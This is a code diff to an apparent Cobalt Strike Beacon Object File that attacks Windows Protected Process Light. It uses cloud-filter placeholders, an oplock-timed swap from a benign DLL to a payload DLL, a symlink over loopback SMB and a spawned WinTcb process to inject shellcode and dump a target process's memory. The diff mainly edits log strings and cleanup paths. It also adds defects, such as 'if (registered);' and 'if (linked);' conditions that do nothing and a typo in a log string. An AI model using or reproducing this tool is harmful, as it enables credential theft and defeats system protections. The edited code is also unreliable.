@@ -71,7 +71,7 @@ BOOL AcquireOplock(HANDLE *hFile, HANDLE *hEvent)
         return FALSE;
     }
 
-    internal_printf( "Acquired exclusive oplock to file: %ws", gpOplockFile);
+    internal_printf( "Acquired exclusive oplock to file: %ws\n", gpOplockFile);
     
     *hEvent = ovl.hEvent;
 
@@ -109,7 +109,7 @@ VOID CALLBACK FetchDataCallback (
     fpCfExecute _CfExecute = (fpCfExecute ) GetProcAddress(hcldapi, "CfExecute");
     static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;
 
-    internal_printf( "FetchDataCallback called.");
+    internal_printf( "FetchDataCallback called.\n");
 
     // Use an SRWLock to synchronize this function
     _TryAcquireSRWLockExclusive(&sFetchDataCallback);
@@ -143,7 +143,7 @@ VOID CALLBACK FetchDataCallback (
     opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
     opParams.TransferData.Length.QuadPart = bytesRead;
     
-    internal_printf( "Hydrating %llu bytes at offset %llu", 
+    internal_printf( "Hydrating %llu bytes at offset %llu\n", 
         opParams.TransferData.Length.QuadPart,
         opParams.TransferData.Offset.QuadPart);
 
@@ -159,13 +159,13 @@ VOID CALLBACK FetchDataCallback (
             gBenignFileAttributes.nFileSizeLow))
 
     {
-        internal_printf( "Switching to payload");
+        internal_printf( "Switching to payloan");
         hCurrentFile = hPayloadFile;
 
-        internal_printf( "Emptying system working set");
+        internal_printf( "Emptying system working set\n");
         EmptySystemWorkingSet();
 
-        internal_printf( "Give the memory manager a moment to think");
+        internal_printf( "Give the memory manager a moment to think\n");
         KERNEL32$Sleep(100);
 
         MSVCRT$memset(buf, 0, CallbackParameters->FetchData.RequiredLength.QuadPart);
@@ -188,7 +188,7 @@ VOID CALLBACK FetchDataCallback (
         opParams.TransferData.Offset.QuadPart = 0;
         opParams.TransferData.Length.QuadPart = bytesRead;
 
-        internal_printf( "Hydrating %llu PAYLOAD bytes at offset %llu",
+        internal_printf( "Hydrating %llu PAYLOAD bytes at offset %llu\n",
             opParams.TransferData.Length.QuadPart,
             opParams.TransferData.Offset.QuadPart);
 
@@ -310,7 +310,7 @@ BOOL CleanupSymlink()
     // Make sure BACKUP exists before attempting to restore
     if (!FileExists(HIJACK_DLL_PATH_BACKUP))
     {
-        internal_printf( "No cleanup necessary.  Backup does not exist.");
+        internal_printf( "No cleanup necessary.  Backup does not exist.\n");
         return FALSE;
     }
 
@@ -343,7 +343,7 @@ BOOL SpawnPPL()
         return FALSE;
     }
 
-    internal_printf( "SpawnPPL: Waiting for child process to finish.");
+    internal_printf( "SpawnPPL: Waiting for child process to finish.\n");
     
     dwResult = KERNEL32$WaitForSingleObject(pi.hProcess, 60 * 1000);
     if (WAIT_OBJECT_0 != dwResult)
@@ -381,6 +381,8 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     ULONGLONG endTime = 0;
     wchar_t * dumpPath;
     char* payloadBuf;
+    BOOL registered = FALSE;
+    BOOL linked = FALSE;
     oplock* op = intAlloc(sizeof(oplock));
     GetFNPtr(hkernel32, "CreateDirectoryW", _CreateDirectoryW, fpCreateDirectoryW);
    
@@ -409,7 +411,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     if (INVALID_HANDLE_VALUE == hPayloadFile)
     {
         BeaconPrintf(CALLBACK_ERROR, "Failed to open file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
-        return 1;
+        goto Cleanup;
     }
 
     hCurrentFile = hBenignFile;
@@ -418,7 +420,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     if (!BuildPayload(hBenignFile, &payloadBuf, dwTargetProcessId, dumpPath, &payloadLen, shellcode, shellcodelen))
     {
         BeaconPrintf(CALLBACK_ERROR, "Failed to build payload");
-        return 1;
+        goto Cleanup;
     }
     GetFNPtr(hkernel32, "WriteFile", _WriteFile, fpWriteFile);
 
@@ -426,7 +428,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
         (bytesWritten != payloadLen))
     {
         BeaconPrintf(CALLBACK_ERROR, "Failed to write payload file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
-        return 1;
+        goto Cleanup;;
     }
     intFree(payloadBuf);
     GUID gid = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };
@@ -452,8 +454,9 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     if (!SUCCEEDED(hRet))
     {
         BeaconPrintf(CALLBACK_ERROR, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
-        return 1;
+        goto Cleanup;
     }
+    registered = TRUE;
     if (!AcquireOplock(&(op->hFile), &(op->hEvent)))
     {
         goto Cleanup;
@@ -469,15 +472,14 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     hRet = _CfConnectSyncRoot(PLACEHOLDER_DLL_DIR, cbReg, op, CF_CONNECT_FLAG_NONE, &gConnectionKey);
     if (!SUCCEEDED(hRet))
     {
-        _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
         BeaconPrintf(CALLBACK_ERROR, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
-        return 1;
+        goto Cleanup;
     }
     GetFNPtr(hkernel32, "GetFileAttributesExW", _GetFileAttributesExW, fpGetFileAttributesExW);
     if (!_GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
     {
         BeaconPrintf(CALLBACK_ERROR, "GetFileAttributesExW on benign file failed with GLE %u", hRet, KERNEL32$GetLastError());
-        return 1;
+        goto Cleanup;
     }
 
     // Create placeholder
@@ -496,21 +498,21 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     hRet = CLDAPI$CfCreatePlaceholders(PLACEHOLDER_DLL_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
     if (!SUCCEEDED(hRet) || (1 != processed))
     {
-        _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
         BeaconPrintf(CALLBACK_ERROR, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
-        return 1;
+        goto Cleanup;
     }
 
     // Replace target file with a symlink over loopback SMB to the placeholder file
     if (!InstallSymlink())
     {
         BeaconPrintf(CALLBACK_ERROR, "InstallSymlink failed.  Aborting.");
-        return 1;
+        goto Cleanup;
     }
+    linked = TRUE;
 
-    internal_printf( "Benign: %ws", HIJACK_DLL_PATH_BACKUP);
-    internal_printf( "Payload: %ws", PAYLOAD_DLL_PATH);
-    internal_printf( "Placeholder: %ws", PLACEHOLDER_DLL_PATH);
+    internal_printf( "Benign: %ws\n", HIJACK_DLL_PATH_BACKUP);
+    internal_printf( "Payload: %ws\n", PAYLOAD_DLL_PATH);
+    internal_printf( "Placeholder: %ws\n", PLACEHOLDER_DLL_PATH);
 
 
 
@@ -519,7 +521,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     {
         if (KERNEL32$DeleteFileW(dumpPath))
         {
-            internal_printf( "Removed old dump file: %ws", dumpPath);
+            internal_printf( "Removed old dump file: %ws\n", dumpPath);
         }
         else
         {
@@ -528,7 +530,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
         }
     }
 
-    internal_printf( "Ready.  Spawning WinTcb.");
+    internal_printf( "Ready.  Spawning WinTcb.\n");
     if (!SpawnPPL())
     {
         goto Cleanup;
@@ -555,27 +557,33 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
         uli.LowPart = dumpAttr.nFileSizeLow;
         uli.HighPart = dumpAttr.nFileSizeHigh;
 
-        internal_printf( "Dump saved to: %ws", dumpPath);
+        internal_printf( "Dump saved to: %ws\n", dumpPath);
 
         if (!SHLWAPI$StrFormatByteSizeW(uli.QuadPart, bytesPretty, _countof(bytesPretty)))
         {
-            internal_printf( "StrFormatByteSizeW failed with GLE %u", KERNEL32$GetLastError());
+            internal_printf( "StrFormatByteSizeW failed with GLE %u\n", KERNEL32$GetLastError());
         }
         else
         {
-            internal_printf( "Dump is %ws", bytesPretty);
+            internal_printf( "Dump is %ws\n", bytesPretty);
         }
 
         endTime = _GetTickCount64();
-        internal_printf( "Operation took %u ms", endTime - startTime);
+        internal_printf( "Operation took %u ms\n", endTime - startTime);
     }
 
     result = 0;
 
 Cleanup:
+    if(hPayloadFile)
+        KERNEL32$CloseHandle(hPayloadFile);
+    if (hBenignFile)
+        KERNEL32$CloseHandle(hBenignFile);
     ReleaseOplock(op);
     KERNEL32$Sleep(100);
+    if (registered);
     _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
+    if (linked);
     CleanupSymlink();
     intFree(op);
     
